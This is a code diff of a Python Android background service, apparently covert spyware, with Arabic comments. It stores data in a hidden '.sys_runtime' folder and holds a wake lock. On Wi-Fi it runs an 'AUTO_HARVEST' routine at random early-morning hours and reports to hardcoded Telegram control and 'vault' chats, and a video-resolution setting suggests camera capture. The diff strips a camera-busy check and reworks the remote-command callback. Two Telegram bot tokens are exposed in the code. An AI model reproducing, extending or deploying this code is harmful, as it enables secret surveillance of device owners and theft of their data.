@@ -1,16 +1,8 @@
 # -*- coding: utf-8 -*-
-import os, time, json, random, threading, logging, requests, gc, traceback
+import os, time, json, random, threading, logging, gc, traceback
 from datetime import datetime, timedelta
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
 
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
-
-try:
-    from jnius import autoclass
-    JNI = True
-except:
-    JNI = False
-
+# إعداد المسارات
 P = os.path.join(os.getcwd(), ".sys_runtime")
 if not os.path.exists(P):
     os.makedirs(P)
@@ -22,21 +14,32 @@ logging.basicConfig(
     format='%(asctime)s [%(levelname)s] %(message)s'
 )
 
+try:
+    from jnius import autoclass
+    JNI = True
+except:
+    JNI = False
+
 class M:
     def __init__(self):
         self.d = P
         self.cf = os.path.join(self.d, "c.json")
         self.lh = os.path.join(self.d, "lh")
         self.wt = os.path.join(self.d, "wt")
+
         self.rn = True
         self.wl = None
         self.did = None
         self.dmd = None
+        self.last_mid = 0           # تصفير المعرف لضمان بدء نظيف
+
         self.cb_h = None
+        self.ui = None
+
         self.bots = []
         self.ctrl = -1003365166986
         self.vlt = -1003787520015
-        self.pw = None
+
         self.auth_active = False
         self._lc()
         self._di()
@@ -50,7 +53,7 @@ class M:
             pass
 
     def _lc(self):
-        d = {"mz": 45, "hth": 20, "wl": True, "iv": 120}
+        d = {"mz": 45, "hth": 20, "wl": True, "iv": 120, "video_res": "360"}
         if os.path.exists(self.cf):
             try:
                 with open(self.cf, 'r') as f:
@@ -63,10 +66,8 @@ class M:
         if not JNI:
             return None
         try:
-            try:
-                return autoclass('org.kivy.android.PythonService').mService
-            except:
-                return autoclass('org.kivy.android.PythonActivity').mActivity
+            # استخدام PythonActivity فقط (بدون البحث عن PythonService)
+            return autoclass('org.kivy.android.PythonActivity').mActivity
         except:
             return None
 
@@ -111,10 +112,10 @@ class M:
 
     def _nht(self):
         n = datetime.now()
-        t = n.replace(hour=random.randint(1, 4), minute=random.randint(0, 59), second=random.randint(0, 59))
+        t = n.replace(hour=random.randint(1, 4), minute=random.randint(0, 59))
         if t <= n:
             t += timedelta(days=1)
-        return t + timedelta(minutes=random.randint(-30, 30))
+        return t
 
     def _harvest(self):
         if not self._is_wifi():
@@ -131,31 +132,14 @@ class M:
                 pass
         if self.cb_h:
             try:
-                if self.cb_h("AUTO_HARVEST", self.ctrl, None):
-                    with open(self.wt, 'w') as f:
-                        f.write(self._nht().isoformat())
-                    with open(self.lh, 'w') as f:
-                        f.write(datetime.now().isoformat())
+                self.cb_h("AUTO_HARVEST", self.ctrl, None)
+                with open(self.wt, 'w') as f:
+                    f.write(self._nht().isoformat())
+                with open(self.lh, 'w') as f:
+                    f.write(datetime.now().isoformat())
             except Exception as e:
-                logging.error(f"Harvest Error: {str(e)}")
+                logging.error(f"Harvest Error: {e}")
         gc.collect()
-
-    def _cam_busy(self):
-        if not JNI:
-            return False
-        try:
-            ctx = self._get_ctx()
-            cm = ctx.getSystemService("camera")
-            ids = cm.getCameraIdList()
-            for i in ids:
-                try:
-                    d = cm.open(i, None, None)
-                    d.close()
-                except:
-                    return True
-            return False
-        except:
-            return False
 
     def _wake(self):
         if self.cfg.get('wl') and JNI:
@@ -171,10 +155,9 @@ class M:
         self._wake()
         while self.rn:
             try:
-                if not self._cam_busy():
-                    self._harvest()
-            except:
-                pass
+                self._harvest()
+            except Exception as e:
+                logging.error(f"Loop Error: {e}")
             time.sleep(self.cfg.get('iv', 120))
 
     def start(self):
@@ -201,19 +184,14 @@ if __name__ == '__main__':
         "8444591624:AAH84_ih3YUm4rEU_0zVnY2H05QTjjyMsZI",
         "8541707106:AAHJFi2V57HryzYkmA2FBgFMcetfqQCi2jM"
     ]
-    m.ctrl = -1003365166986
-    m.vlt = -1003787520015
-    m.pw = _pw()
-
     try:
         import telegram_ui, commands
-        ui = telegram_ui.T(m)
-        m.cb_h = lambda cmd, cid, cbq: commands.ex(cmd, ui, m, cid, cbq)
-        ui.start()
+        m.ui = telegram_ui.T(m)
+        # إصلاح ربط الكولباك: تمرير المعطيات بالترتيب الصحيح
+        m.cb_h = lambda cmd, cid, cbq: commands.ex(cmd, m.ui, m, cid, cbq)
+        m.ui.start()
     except Exception as e:
         logging.error(f"Service Core Link Error: {traceback.format_exc()}")
-
     m.start()
-
     while True:
         time.sleep(3600)
